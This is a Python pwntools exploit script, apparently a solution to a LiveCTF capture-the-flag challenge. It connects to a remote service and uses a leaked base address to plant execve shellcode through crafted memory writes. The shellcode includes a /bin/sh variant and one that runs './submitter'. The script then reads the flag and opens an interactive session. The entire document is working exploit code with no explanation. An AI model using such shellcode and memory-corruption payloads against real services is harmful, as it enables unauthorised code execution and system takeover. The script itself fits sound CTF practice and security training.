from pwn import *
context.log_level='debug'
context.arch='amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p=  remote(HOST, int(PORT))
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)


base = u64(p.read(8))
warning(hex(base))
xxx = 0x3000-0x400
sh=asm('''
xor rax,rax
mov al,0x3b
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
''')
sh=asm(shellcraft.execve("./submitter",0,0))
sh+=b"\x90"*((-len(sh))%8)
pay = b''
for _ in range(int(len(sh)//8)):
    pay+= p64(base+xxx+_*8)+sh[_*8:_*8+8]
# p.send(p64(base+0x4330)+p64(xxx+base)+pay+p64(0))

p.send(p64(base+0x45B4)+p64(0)+\
       p64(base+0x4338)+p64(0x1200+base)+\
       p64(base+0x4330)+p64(0x1370+base)+\
       p64(0))
p.send(p32(0))


# pay
# 
# ru("!\n")
p.read(8)
p.send(pay+p64(base+0x45B4)+p64(0)+\
       p64(base+0x4330)+p64(xxx+base)+\
       p64(base+0x4330-8)+p64(xxx+base)+\
       p64(0))
# p.send(p32(0))
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()